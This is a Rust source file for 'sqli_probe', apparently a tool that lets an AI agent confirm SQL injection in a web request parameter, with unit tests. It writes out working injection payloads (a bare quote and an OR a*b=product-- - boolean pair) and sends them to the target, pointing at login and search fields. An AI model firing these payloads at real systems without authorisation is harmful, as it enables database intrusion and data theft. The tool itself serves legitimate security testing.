//! Port of `src/main/mcp/tools/sqli_probe.ts` — confirm SQL injection at a
//! request parameter. Fires a bare-quote error payload and a nonce arithmetic
//! boolean pair (`z..z' OR a*b=ab-- -` vs `=ab+1`): the pair is confirmed only
//! when the two responses differ after payload echoes are stripped, i.e. the
//! server evaluated the arithmetic (an echo proves nothing).

use std::collections::HashMap;
use std::sync::{LazyLock, PoisonError};
use std::time::Duration;

use regex::Regex;
use rever_tools_api::tool::{BoxFuture, Tool, ToolContext, ToolDef};
use rever_tools_api::utils::{ToolResult, err, ok};
use rever_tools_http::{build_request_spec, restore_marker, send};
use serde_json::{Value, json};

use crate::args::{text, validate};
use crate::common::{
    apply_payload, encode_uri_component, form_slot_to_marker, has_marker, is_form_urlencoded,
    pick_prime, random_nonce, url_slot_to_marker,
};
use crate::{pretty, schema};

const SEND_TIMEOUT: Duration = Duration::from_secs(15);

/// DB/driver error signatures that leak into a response body (`/..../i`).
static SQL_ERROR_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)(sql synta|syntax error|unclosed quotation|mysql|mariadb|postgres|\bpsql\b|sqlite|programmingerror|operationalerror|integrityerror|jdbc|odbc)",
    )
    .expect("valid")
});

/// Collapse runs of whitespace to a single space (JS `/\s+/g`).
static WS_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\s+").expect("valid"));

struct SqliCase {
    context: &'static str,
    payload: String,
}

struct SqliReply {
    context: String,
    status: u16,
    body: String,
    payload: String,
}

#[derive(Debug, PartialEq, Eq)]
struct SqliOutcome {
    sqli: bool,
    contexts: Vec<String>,
}

/// Bare quote (error-based) + a nonce arithmetic boolean pair that differs only
/// in the compared value (`a*b` vs `a*b+1`), so one side is true, the other false.
fn build_sqli_cases(a: u32, b: u32, nonce: &str) -> Vec<SqliCase> {
    let product = a * b;
    vec![
        SqliCase {
            context: "error",
            payload: format!("{nonce}'"),
        },
        SqliCase {
            context: "bool-true",
            payload: format!("{nonce}' OR {a}*{b}={product}-- -"),
        },
        SqliCase {
            context: "bool-false",
            payload: format!("{nonce}' OR {a}*{b}={}-- -", product + 1),
        },
    ]
}

/// Every encoding a reflected payload may come back in; stripping all of them
/// from BOTH boolean bodies means a surviving difference is server behavior.
fn echo_variants(p: &str) -> Vec<String> {
    vec![
        p.to_owned(),
        p.replace(' ', "+"),
        encode_uri_component(p),
        p.replace('\'', "%27").replace(' ', "+"),
        p.replace('\'', "&#39;"),
        p.replace('\'', "&#x27;"),
    ]
}

fn normalized(r: &SqliReply) -> String {
    let mut stripped = r.body.clone();
    for variant in echo_variants(&r.payload) {
        stripped = stripped.split(&variant).collect::<Vec<_>>().join("");
    }
    format!("{}|{}", r.status, WS_RE.replace_all(&stripped, " "))
}

/// Confirmed iff a DB error signature appears, or the boolean pair differs.
fn sqli_evaluated(replies: &[SqliReply]) -> SqliOutcome {
    let mut by_ctx: HashMap<&str, &SqliReply> = HashMap::new();
    for r in replies {
        by_ctx.insert(r.context.as_str(), r);
    }
    let mut contexts: Vec<String> = Vec::new();
    if let Some(e) = by_ctx.get("error")
        && SQL_ERROR_RE.is_match(&e.body)
    {
        contexts.push("error".to_owned());
    }
    if let (Some(t), Some(f)) = (by_ctx.get("bool-true"), by_ctx.get("bool-false"))
        && normalized(t) != normalized(f)
    {
        contexts.push("boolean".to_owned());
    }
    SqliOutcome {
        sqli: !contexts.is_empty(),
        contexts,
    }
}

/// Snap a byte index to the nearest valid UTF-8 char boundary (up or down).
fn snap_boundary(s: &str, index: usize, up: bool) -> usize {
    let mut i = index.min(s.len());
    if up {
        while i < s.len() && !s.is_char_boundary(i) {
            i += 1;
        }
    } else {
        while i > 0 && !s.is_char_boundary(i) {
            i -= 1;
        }
    }
    i
}

/// `m ? body.slice(m.index-30, m.index+60) : body.slice(0, 120)`, UTF-8 safe.
fn preview(body: &str) -> String {
    match SQL_ERROR_RE.find(body) {
        Some(m) => {
            let lo = snap_boundary(body, m.start().saturating_sub(30), true);
            let hi = snap_boundary(body, m.start() + 60, false);
            body.get(lo..hi).unwrap_or("").to_owned()
        }
        None => body.chars().take(120).collect(),
    }
}

pub struct SqliProbe;

impl Tool for SqliProbe {
    fn def(&self) -> ToolDef {
        ToolDef::new(
            "sqli_probe",
            "Confirm SQL injection at a request parameter. Fires a bare-quote payload (error-based: DB error signature in the response) and a nonce arithmetic boolean pair (`z..z' OR 2*3=6-- -` vs `=7`): the pair is confirmed only when the two responses differ after stripping payload echoes — i.e. the server evaluated the arithmetic, an echo proves nothing. Pass param=<query or form field name> and the tool marks the slot itself. Login/search form fields are the classic carriers. A positive result is data-exfiltration class; record as critical.",
            schema(
                json!({
                    "requestId": { "type": "string" },
                    "param": { "type": "string", "description": "Query or form field that carries the value (e.g. \"username\") — the tool marks it with § itself" },
                    "a": { "type": "integer", "description": "First factor (test determinism; default random prime)" },
                    "b": { "type": "integer", "description": "Second factor (default random prime)" }
                }),
                &["requestId"],
            ),
        )
    }

    fn call<'a>(&'a self, ctx: &'a ToolContext, args: Value) -> BoxFuture<'a, ToolResult> {
        Box::pin(async move {
            if let Err(refusal) = validate(&self.def(), &args) {
                return refusal;
            }
            let request_id = text(&args, "requestId").unwrap_or_default().to_owned();
            let param = text(&args, "param").map(str::to_owned);
            let a = args
                .get("a")
                .and_then(Value::as_u64)
                .map(|n| n as u32)
                .unwrap_or_else(pick_prime);
            let b = args
                .get("b")
                .and_then(Value::as_u64)
                .map(|n| n as u32)
                .unwrap_or_else(pick_prime);
            let nonce = random_nonce();

            let mut base = {
                let store = ctx.traffic.lock().unwrap_or_else(PoisonError::into_inner);
                match build_request_spec(&store, Some(&request_id), None) {
                    Ok(spec) => restore_marker(spec),
                    Err(error) => return err(error),
                }
            };

            if let Some(param) = &param {
                if base
                    .url
                    .contains(&format!("{}=", encode_uri_component(param)))
                {
                    base.url = url_slot_to_marker(&base.url, param);
                } else {
                    base.body = Some(form_slot_to_marker(
                        base.body.as_deref().unwrap_or(""),
                        param,
                    ));
                }
            }
            if !has_marker(&base) {
                return err(
                    "no injectable slot: pass param=<query or form field name> (e.g. param: \"username\") or stage a request with a literal § marker first",
                );
            }

            let form_body = is_form_urlencoded(&base);
            let cases = build_sqli_cases(a, b, &nonce);
            let mut replies: Vec<SqliReply> = Vec::with_capacity(cases.len());
            let mut results: Vec<Value> = Vec::with_capacity(cases.len());
            for case in &cases {
                let variant = apply_payload(&base, &case.payload, form_body);
                let out = send(&variant, SEND_TIMEOUT).await;
                let status = out.status;
                let snippet = preview(&out.body);
                replies.push(SqliReply {
                    context: case.context.to_owned(),
                    status,
                    body: out.body,
                    payload: case.payload.clone(),
                });
                results.push(json!({
                    "context": case.context,
                    "status": status,
                    "preview": snippet,
                }));
            }

            let outcome = sqli_evaluated(&replies);
            let note = if outcome.sqli {
                "SQL injection confirmed (error signature and/or boolean arithmetic differential) — data exfiltration class, record as critical."
            } else {
                "No DB error signature and no boolean differential; the value likely does not reach a query unsafely."
            };
            ok(pretty(&json!({
                "sqli": outcome.sqli,
                "contexts": outcome.contexts,
                "note": note,
                "results": results,
            })))
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn reply(context: &str, payload: &str, body: &str, status: u16) -> SqliReply {
        SqliReply {
            context: context.to_owned(),
            status,
            body: body.to_owned(),
            payload: payload.to_owned(),
        }
    }

    #[test]
    fn 에러_페이로드와_불리언_산술_참거짓_쌍을_만든다() {
        let cases = build_sqli_cases(101, 103, "zXYZz");
        assert_eq!(
            cases.iter().map(|c| c.context).collect::<Vec<_>>(),
            vec!["error", "bool-true", "bool-false"]
        );
        assert_eq!(cases[0].payload, "zXYZz'");
        assert_eq!(
            cases[1].payload,
            format!("zXYZz' OR 101*103={}-- -", 101 * 103)
        );
        assert_eq!(
            cases[2].payload,
            format!("zXYZz' OR 101*103={}-- -", 101 * 103 + 1)
        );
        // true/false differ only in the compared value, so same length.
        assert_eq!(cases[1].payload.len(), cases[2].payload.len());
    }

    #[test]
    fn db_드라이버_에러_시그니처에만_반응한다() {
        assert!(SQL_ERROR_RE.is_match(
            r#"{"error":{"type":"ProgrammingError","message":"You have an error in your SQL syntax"}}"#
        ));
        assert!(SQL_ERROR_RE.is_match("mysql.connector.errors.ProgrammingError"));
        assert!(SQL_ERROR_RE.is_match(r#"(sqlite3.OperationalError) near "z": syntax error"#));
        assert!(!SQL_ERROR_RE.is_match("Invalid user or password"));
        assert!(!SQL_ERROR_RE.is_match("Welcome to the secure terminal"));
    }

    #[test]
    fn 에러_응답에_sql_시그니처가_있으면_error_컨텍스트로_확정한다() {
        let cases = build_sqli_cases(101, 103, "zXYZz");
        let (t, f) = (&cases[1], &cases[2]);
        let out = sqli_evaluated(&[
            reply("error", "zXYZz'", "500: ProgrammingError sql syntax", 500),
            reply("bool-true", &t.payload, "x", 200),
            reply("bool-false", &f.payload, "x", 200),
        ]);
        assert_eq!(
            out,
            SqliOutcome {
                sqli: true,
                contexts: vec!["error".to_owned()]
            }
        );
    }

    #[test]
    fn true_false_응답이_차등이면_boolean_컨텍스트로_확정한다() {
        let cases = build_sqli_cases(101, 103, "zXYZz");
        let (t, f) = (&cases[1], &cases[2]);
        let out = sqli_evaluated(&[
            reply("error", "zXYZz'", "Not Found", 200),
            reply("bool-true", &t.payload, "3 results for admin", 200),
            reply("bool-false", &f.payload, "0 results", 200),
        ]);
        assert_eq!(
            out,
            SqliOutcome {
                sqli: true,
                contexts: vec!["boolean".to_owned()]
            }
        );
    }

    #[test]
    fn 페이로드가_리터럴로_반사되기만_하면_차등이_아니다_오탐_방지() {
        let echo = |p: &str| format!("search echoed: {p}");
        let cases = build_sqli_cases(101, 103, "zXYZz");
        let (t, f) = (&cases[1], &cases[2]);
        let out = sqli_evaluated(&[
            reply("error", "zXYZz'", "no results", 200),
            reply("bool-true", &t.payload, &echo(&t.payload), 200),
            reply("bool-false", &f.payload, &echo(&f.payload), 200),
        ]);
        assert!(!out.sqli);
    }

    #[test]
    fn html_이스케이프된_반사도_에코_변형_제거로_중립화된다() {
        let echo = |p: &str| format!("value: {}", p.replace('\'', "&#39;"));
        let cases = build_sqli_cases(101, 103, "zXYZz");
        let (t, f) = (&cases[1], &cases[2]);
        let out = sqli_evaluated(&[
            reply("error", "zXYZz'", "ok", 200),
            reply("bool-true", &t.payload, &echo(&t.payload), 200),
            reply("bool-false", &f.payload, &echo(&f.payload), 200),
        ]);
        assert!(!out.sqli);
    }

    #[test]
    fn 세_응답이_동일하면_음성() {
        let cases = build_sqli_cases(101, 103, "zXYZz");
        let (t, f) = (&cases[1], &cases[2]);
        let out = sqli_evaluated(&[
            reply("error", "zXYZz'", "Invalid user or password", 401),
            reply("bool-true", &t.payload, "Invalid user or password", 401),
            reply("bool-false", &f.payload, "Invalid user or password", 401),
        ]);
        assert_eq!(
            out,
            SqliOutcome {
                sqli: false,
                contexts: vec![]
            }
        );
    }
}
